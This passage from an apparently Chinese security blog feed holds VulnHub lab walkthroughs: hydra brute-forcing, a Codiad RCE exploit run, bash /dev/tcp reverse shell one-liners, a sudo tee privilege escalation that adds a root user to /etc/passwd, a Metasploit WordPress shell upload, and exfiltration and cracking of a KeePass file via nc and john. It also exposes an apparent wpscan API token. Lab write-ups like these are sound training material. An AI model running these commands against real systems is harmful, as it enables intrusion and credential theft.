&lt;p&gt;发现了一个敏感的地址，进入后需要发现认证:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvaW5mZXJubw==&#34;&gt;http://192.168.31.25/inferno&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1069.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也没有别的办法了，只能对这个页面进行爆破用户名和密码&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破网站后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破网站后台&#34;&gt;#&lt;/a&gt; hydra 爆破网站后台&lt;/h3&gt;
&lt;p&gt;利用 hydra 选取合适的用户名字典进行爆破&lt;br&gt;
 &lt;code&gt;hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.2 5 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1070.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的&lt;br&gt;
 &lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1071.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待大概两三个小时差不多就出结果了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;凭借 admin:dante1 可进入网站第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和密码是相同的输入 admin:dante1 后成功进入网站后台&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1072.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;文件上传尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传尝试&#34;&gt;#&lt;/a&gt; 文件上传尝试&lt;/h3&gt;
&lt;p&gt;这是一些 php 的源码文件，代码审计后没有发现突破口&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1073.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;右键可以上传文件，可以上传一个 php 文件看看什么效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1074.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传 shell.php 文件用来反弹 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1075.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1076.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个框架，可以去搜索这个框架自身有没有漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1077.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;codiad-rce漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#codiad-rce漏洞&#34;&gt;#&lt;/a&gt; codiad RCE 漏洞&lt;/h3&gt;
&lt;p&gt;本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1078.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-x 确定 exp 的位置，将 exp 复制到自己的目录下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1079.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用 py 运行此程序，看一下使用说明&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依据使用说明，构造好命令&lt;br&gt;
 &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 4444&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1081.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情况，这时就需要在去寻找新的 payload 进行利用&lt;/p&gt;
&lt;p&gt;找到了一个 RCE 漏洞的脚本: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==&#34;&gt;https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1082.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;python exploit.py http://192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1083.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有加第一层认证回显了未授权  &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/) admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1084.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 4445 端口处接收到了反弹的 shell, 拿到了网站的 webshell, 依据下面三个命令输出为一个标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1085.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;十六进制换算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#十六进制换算&#34;&gt;#&lt;/a&gt; 十六进制换算&lt;/h3&gt;
&lt;p&gt;看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1086.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件，打开之后看到是一串 16 进制的数据，需要解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1087.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1088.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在密码的最后有个小数点，并不知道这个小数点是否参与了密码，但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1089.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;凭借第二个密码拿到了 dante 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;term-设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#term-设置&#34;&gt;#&lt;/a&gt; TERM 设置&lt;/h3&gt;
&lt;p&gt;输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM 改为 xterm 即可解决这个终端美化问题&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1090.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tee权限错误写passwd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tee权限错误写passwd&#34;&gt;#&lt;/a&gt; tee 权限错误写 passwd&lt;/h3&gt;
&lt;p&gt;sudo -l 看到直接调用 tee 命令写入文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1091.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己的一些数据追加到本地的文件里边，基于此，构造一个 SHA512 的密码，直接往 /etc/passwd 里边添加一个 root 账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1092.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用 kali 机器生成一个 SHA512 的值，密码为 123456  &lt;code&gt;mkpasswd --method=SHA-512 --stdin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1093.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在靶机上依次执行下列命令，报错先不管&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入新的享有root功能的用户&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt; 2 并验证是否写入成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LFILE=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;test2:$6$/VIJFJppMzTLzIjH$fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33GThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&amp;#x27; | sudo tee -a &amp;quot;$LFILE&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依据新建的用户进入其shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su test2 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1094.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 结果显示我们当前已经拿到了 root 账户&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/136%20GROTESQUE1/</id>
        <title>VULNHUB 36 GROTESQUE1</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/136%20GROTESQUE1/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv&#34;&gt;https://www.vulnhub.com/entry/grotesque-101,658/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=&#34;&gt;https://blog.csdn.net/Perpetual_Blue/article/details/124541893&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE1：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-950.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.29、靶机开放端口 80&lt;/p&gt;
&lt;p&gt;2 ）再次确认开放端口&lt;/p&gt;
&lt;p&gt;识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵入到系统，需要再次进行扫描判断结果是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-951.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 66,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjk=&#34;&gt;http://192.168.31.29&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-952.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.29&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-953.png&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口可以放弃了，开始把目标放在 66 端口上&lt;/p&gt;
&lt;h3 id=&#34;智力游戏解谜1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜1&#34;&gt;#&lt;/a&gt; 智力游戏解谜 1&lt;/h3&gt;
&lt;p&gt;打开 http://192.168.31.29:66/ 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-954.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到有个地址可以直接下载项目地址，这里我们直接点击下载&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-955.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这么多文件，一眼看去只有几个是 1.18 号的文件，先对这几个文件测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-956.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;按日期这一列对这些文件进行排序，输入如下命令  &lt;code&gt;ls -Alh | sort -k 7&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-957.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来就依次看看这几个文件  &lt;code&gt;cat assets/* | sort | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-958.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一堆乱码，是没有价值的信息 &lt;code&gt;cat index.md&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-959.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个文件没有有价值的信息 &lt;code&gt;cat _vvmlist | sort | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-960.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 在这个文件中找到了一个 wordpress 的站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-961.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZw==&#34;&gt;http://192.168.31.29/lyricsblog&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-962.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用 wpscan 工具对 wordpress 站点进行扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-963.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一个用户名 erdalkomurcu&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-964.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;指定用户为 erdalkomurcu 进行密码爆破&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -U erdalkomurcu -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-965.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;密码爆破了很长时间都没成功，可能是一个复杂密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-966.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;从工具出发没有找到，那么我们就从常规的目录扫描进行测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-967.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一些常规的目录，没有什么特殊的，就是有一个 login 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-968.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看看靶机作者有没有遗留一些提示给我们&lt;/p&gt;
&lt;h3 id=&#34;智力游戏解谜2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜2&#34;&gt;#&lt;/a&gt; 智力游戏解谜 2&lt;/h3&gt;
&lt;p&gt;查看 wordpress 首页的源代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=&#34;&gt;http://192.168.31.19/lyricsblog/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-969.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问这个网址，得到一个文件: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy95ZXNtYW4ucG5n&#34;&gt;http://192.168.31.29/lyricsblog/yesman.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-970.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看面有没有什么线索。观察上边的图片，对比在站点上找到的页面，发现了一个巧合点，此图片顶头有个 YES,I ENJOY HAKAN TASIYAN, 网页上有一段标题为 Hakan Taşıyan – Doktor 可能突破点就在于这个点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-971.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进到这个页面之后，这里有三段文字&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-972.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是不是有联系，将不带标题的段落文本复制到文本文件中并保存，计算并检查 MD5 消息摘要&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-973.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md5 数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-974.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆失败，将 md5 数据由小写变为大写再次尝试&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat md5.txt | awk &#39;&amp;#123;print toupper($0)&amp;#125;&#39; &amp;gt;&amp;gt; MD5.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-975.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次登陆此网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.19/lyricsblog/wp-login.php&lt;/span&gt;&lt;br&gt;
 由密码 BC78C6AB38E114D6135409E44F7CDDA2 成功进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-976.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;后台页面显示如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-977.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
&lt;p&gt;可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password BC78C6AB38E114D6135409E44F7CDDA2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username erdalkomurcu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /lyricsblog&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-978.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;options 检查如下参数&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-979.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-980.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;meterpreter反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meterpreter反弹shell&#34;&gt;#&lt;/a&gt; meterpreter 反弹 shell&lt;/h3&gt;
&lt;p&gt;将 msf 的 shell 反弹出来进行美化便于操作&lt;br&gt;
 &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.75/4445 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;nc -lvvp 4445&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-981.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;keepass-密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#keepass-密码破解&#34;&gt;#&lt;/a&gt; keepass 密码破解&lt;/h3&gt;
&lt;p&gt;翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码，并且 /etc/passwd 中是用 raphael 这个用户的  &lt;code&gt;su raphael:_double_trouble_&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-982.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;注意到此用户根目录下有一个隐藏文件.chadroot.kdbx,KeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scp  &lt;code&gt;scp -P22 parallels@192.168.31.73:/home/parallels/Desktop/tmp/.chadroot.kdbx .&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-983.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;nc  &lt;code&gt;nc 192.168.31.73 4446 &amp;lt; .chadroot.kdbx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-984.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;wget  &lt;code&gt;python3 -m http.server 8000&lt;/code&gt;   &lt;code&gt;wget 192.168.31.29/.chadroot.kdbx -O 2.kdbx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-985.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解&lt;/p&gt;
&lt;p&gt;&lt;code&gt;keepass2john .chadroot.kdbx &amp;gt; chadroot&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt chadroot&lt;/code&gt;&lt;/p&gt;
